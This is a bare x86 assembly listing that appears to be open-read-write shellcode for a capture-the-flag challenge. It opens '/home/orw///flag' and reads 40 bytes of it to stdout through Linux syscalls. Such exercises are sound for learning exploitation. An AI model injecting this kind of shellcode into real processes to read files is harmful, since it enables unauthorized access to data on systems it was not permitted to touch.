mov eax, 5
push 0
push 0x67616c66
push 0x2f2f2f77
push 0x726f2f65
push 0x6d6f682f
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80


push eax
pop ebx
mov eax, 3
mov ecx, 0x0804a060
sub ecx, 40
mov edx, 40
int 0x80


mov eax, 4
mov ebx, 1
mov ecx, 0x0804a060
sub ecx, 40
mov edx, 40
int 0x80
